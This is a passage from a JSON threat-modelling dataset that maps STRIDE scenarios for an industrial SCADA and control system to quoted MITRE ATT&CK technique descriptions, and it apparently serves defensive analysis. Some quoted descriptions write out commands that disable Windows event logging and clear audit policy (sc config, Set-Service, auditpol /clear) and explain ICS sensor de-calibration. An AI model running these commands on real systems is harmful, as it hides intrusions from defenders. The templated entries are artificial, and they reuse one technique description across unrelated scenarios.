            "Potential Impact": "Gaining unauthorized control over field devices, leading to manipulation of industrial processes and potential sabotage.",
            "MITRE ATT&CK Keywords": [
                "Firmware Tampering",
                "Process Manipulation",
                "Device Control"
            ],
            "mitre_technique": {
                "name": "Modify Control Logic",
                "description": "Adversaries may place malicious code in a system, which can cause the system to malfunction by modifying its control logic. Control system devices use programming languages (e.g. relay ladder logic) to control physical processes by affecting actuators, which cause machines to operate, based on environment sensor readings. These devices often include the ability to perform remote control logic updates. \n\nProgram code is normally edited in a vendor-specific Integrated Development Environment (IDE) that relies on proprietary tools and features. These IDEs allow an engineer to perform host target development and may have the ability to run the code on the machine it is programmed for. The IDE will transmit the control logic to the testing device, and will perform the required device-specific functions to apply the changes and make them active.\n\nAn adversary may attempt to use this host target IDE to modify device control logic. Even though proprietary tools are often used to edit and update control logic, the process can usually be reverse-engineered and reproduced with open-source tools.\n\nAn adversary can de-calibrate a sensor by removing functions in control logic that account for sensor error. This can be used to change a control process without actually spoofing command messages to a controller or device. \n\nIt is believed this process happened in the lesser known over-pressurizer attacks build into Stuxnet. Pressure sensors are not perfect at translating pressure into an analog output signal, but their errors can be corrected by calibration. The pressure controller can be told what the \u201creal\u201d pressure is for given analog signals and then automatically linearize the measurement to what would be the \u201creal\u201d pressure. If the linearization is overwritten by malicious code on the S7-417 controller, analog pressure readings will be \u201ccorrected\u201d during the attack by the pressure controller, which then interprets all analog pressure readings as perfectly normal pressure no matter how high or low their analog values are. The pressure controller then acts accordingly by never opening the stage exhaust valves. In the meantime, actual pressure keeps rising. (Citation: Stuxnet - Langner - 201311)\n\nIn the Maroochy Attack, Vitek Boden gained remote computer access to the control system and altered data so that whatever function should have occurred at affected pumping stations did not occur or occurred in a different way. The software program installed in the laptop was one developed by Hunter Watertech for its use in changing configurations in the PDS computers. This ultimately led to 800,000 liters of raw sewage being spilled out into the community. (Citation: Maroochy - MITRE - 200808)",
                "id": "attack-pattern--e0d74479-86d2-465d-bf36-903ebecef43e",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "15",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of a legitimate user and gains unauthorized access to the Control Center HMI.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to stolen user credentials.",
                    "Role": "Attacker",
                    "Condition": "Credentials are obtained via phishing or social engineering."
                },
                {
                    "Assumption": "The system does not utilize multi-factor authentication (MFA).",
                    "Role": "System Architect",
                    "Condition": "MFA is not implemented."
                },
                {
                    "Assumption": "The control network is accessible via the internet.",
                    "Role": "Network Operator",
                    "Condition": "The network interface is exposed."
                }
            ],
            "Potential Impact": "Loss of control over manufacturing processes.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "HMI",
                "network",
                "user"
            ],
            "mitre_technique": {
                "name": "VNC",
                "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\u201cremote framebuffer\u201d) protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)\n\nVNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)",
                "id": "attack-pattern--01327cde-66c4-4123-bf34-5f258d59457b",
                "technique_id": "T1021.005"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of a field device to inject fraudulent data into the SCADA system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept communication between field devices and RTUs.",
                    "Role": "Attacker",
                    "Condition": "Access to network channels."
                },
                {
                    "Assumption": "The devices do not use secure communication channels.",
                    "Role": "Device Manufacturer",
                    "Condition": "Lack of encryption."
                },
                {
                    "Assumption": "Device identification relies on weak or non-existent authentication.",
                    "Role": "System Designer",
                    "Condition": "Poor device authentication mechanisms."
                }
            ],
            "Potential Impact": "Corrupted data leading to flawed operational decisions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "data injection",
                "field device",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Persistent threat actors spoof communications between the gateway and cloud services to exfiltrate sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Attackers have control over a compromised device in the network.",
                    "Role": "Attacker",
                    "Condition": "Compromised internal device."
                },
                {
                    "Assumption": "The communication channel between gateway and cloud services is not fully secure.",
                    "Role": "Network Administrator",
                    "Condition": "Weak encryption or no integrity check."
                },
                {
                    "Assumption": "Monitoring and anomaly detection mechanisms are insufficient.",
                    "Role": "Security Team",
                    "Condition": "Lack of monitoring tools."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "exfiltration",
                "cloud services",
                "gateway",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the commands sent from the Control Center to the RTUs.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the communication link between Control Center and RTUs.",
                    "Role": "Attacker",
                    "Condition": "Compromised physical or network access."
                },
                {
                    "Assumption": "The system does not enforce command integrity checks.",
                    "Role": "System Designer",
                    "Condition": "Lack of command validation."
                },
                {
                    "Assumption": "There are no redundancy checks for command validation.",
                    "Role": "System Operator",
                    "Condition": "No redundancy protocols in place."
                }
            ],
            "Potential Impact": "Disruption of manufacturing processes, potential physical damage.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "command control",
                "RTU",
                "network",
                "HMI"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider with access modifies the PLC configurations to disrupt production.",
            "Assumptions": [
                {
                    "Assumption": "The insider has access rights to PLC configurations.",
                    "Role": "Insider",
                    "Condition": "Authorized user actions."
                },
                {
                    "Assumption": "Access logging and monitoring are inadequate.",
                    "Role": "Security Team",
                    "Condition": "Poor auditing practices."
                },
                {
                    "Assumption": "Change control policies are not strictly enforced.",
                    "Role": "System Administrator",
                    "Condition": "Weak change management processes."
                }
            ],
            "Potential Impact": "Compromised integrity of manufacturing processes.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "insider threat",
                "PLC configuration",
                "device",
                "privilege abuse"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware in the cloud services alters data analytics results leading to wrong operational decisions.",
            "Assumptions": [
                {
                    "Assumption": "The cloud services are susceptible to malware attacks.",
                    "Role": "Attacker",
                    "Condition": "Exploitable vulnerabilities in cloud services."
                },
                {
                    "Assumption": "There is no real-time monitoring of data integrity.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Lack of data integrity checks."
                },
                {
                    "Assumption": "Automated systems rely heavily on analytics for decision making.",
                    "Role": "System Architect",
                    "Condition": "High dependency on automated analytics."
                }
            ],
            "Potential Impact": "Production inefficiencies or failures.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "malware",
                "cloud services",
                "data integrity",
                "analytics"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having made specific configuration changes in the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks comprehensive logging and audit trails.",
                    "Role": "System Architect",
                    "Condition": "Inadequate logging mechanisms."
                },
                {
                    "Assumption": "Access control measures are not stringent.",
                    "Role": "Security Administrator",
                    "Condition": "Weak access control policies."
                },
                {
                    "Assumption": "There is no multi-factor authentication in place.",
                    "Role": "System Administrator",
                    "Condition": "Single-factor authentication being used."
                }
            ],
            "Potential Impact": "Difficulty in attributing actions leading to policy violations or security breaches.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "user actions",
                "logging",
                "audit trails",
                "control center"
            ],
            "mitre_technique": {
                "name": "Indicator Blocking",
                "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018), by tampering settings that control the collection and flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nFor example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.(Citation: disable_win_evt_logging) \n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors (Citation: LemonDuck).",
                "id": "attack-pattern--74d2a63f-3c7b-4852-92da-02d8fbab16da",
                "technique_id": "T1562.006"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs actions via a compromised HMI but denies involvement.",
            "Assumptions": [
                {
                    "Assumption": "Compromised credentials are used.",
                    "Role": "Attacker",
                    "Condition": "Credentials obtained via exploitation."
                },
                {
                    "Assumption": "Insufficient activity logging or monitoring.",
                    "Role": "System Operator",
                    "Condition": "Incomplete or non-existent logging."
                },
                {
                    "Assumption": "There are no systems to verify the origin of commands.",
                    "Role": "System Architect",
                    "Condition": "Lack of source verification."
                }
            ],
            "Potential Impact": "Untraceable malicious actions within the system.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "HMI",
                "compromised credentials",
                "command control",
                "logging"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A cloud service provider denies any unauthorized data accesses despite evidence of data exfiltration.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service lacks thorough access logs.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Insufficient logging practices."
                },
                {
                    "Assumption": "Dependence on third-party cloud provider for incident transparency.",
                    "Role": "Company Decision-Maker",
                    "Condition": "Reliance on service provider's logs."
                },
                {
                    "Assumption": "No real-time monitoring or alerts in place.",
                    "Role": "Security Team",
                    "Condition": "Lack of real-time monitoring."
                }
            ],
            "Potential Impact": "Loss of trust, potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "cloud services",
                "data access",
                "logging",
                "data exfiltration"
            ],
            "mitre_technique": {
                "name": "Disabling Security Tools",
                "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.",
                "id": "attack-pattern--2e0dd10b-676d-4964-acd0-8a404c92b044",
                "technique_id": "T1089"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data intercepted between field devices and RTUs is captured by an unauthorized entity.",
            "Assumptions": [
                {
                    "Assumption": "Network communication is not encrypted.",
                    "Role": "Network Administrator",
                    "Condition": "Traffic is in plaintext."
                },
                {
                    "Assumption": "Attacker has access to the network path.",
                    "Role": "Attacker",
                    "Condition": "Compromised local network."
                },
                {
                    "Assumption": "No frequent network security audits are conducted.",
                    "Role": "Security Team",
                    "Condition": "Lack of regular audits."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of operational data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network sniffing",
                "plaintext communication",
                "field device",
                "RTU"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data stored in cloud services is accessed by an unauthorized user.",
            "Assumptions": [
                {
                    "Assumption": "Weak access control policies in the cloud services.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Inadequate access controls."
                },
                {
                    "Assumption": "Credentials are compromised through phishing.",
                    "Role": "Attacker",
                    "Condition": "Success of phishing attack."
                },
                {
                    "Assumption": "No metadata monitoring for unusual access patterns.",
                    "Role": "Security Team",
                    "Condition": "Lack of anomaly detection."
                }
            ],
            "Potential Impact": "Exposure of sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud services",
                "unauthorized access",
                "data breach",
                "phishing"
            ],
            "mitre_technique": {
                "name": "Application Access Token",
                "description": "Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\n",
                "id": "attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a",
                "technique_id": "T1527"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An unauthenticated attacker retrieves data from the MQTT broker used for data communication.",
            "Assumptions": [
                {
                    "Assumption": "MQTT broker allows unauthenticated access.",
                    "Role": "System Designer",
                    "Condition": "No authentication required."
                },
                {
                    "Assumption": "No encryption on the data streams.",
                    "Role": "Network Administrator",
                    "Condition": "Unencrypted data streams."
                },
                {
                    "Assumption": "No real-time monitoring on broker access.",
                    "Role": "Security Team",
                    "Condition": "Lack of monitoring."
                }
            ],
            "Potential Impact": "Leak of real-time data and operational insights.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "MQTT",
                "data communication",
                "broker",
                "unencrypted"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
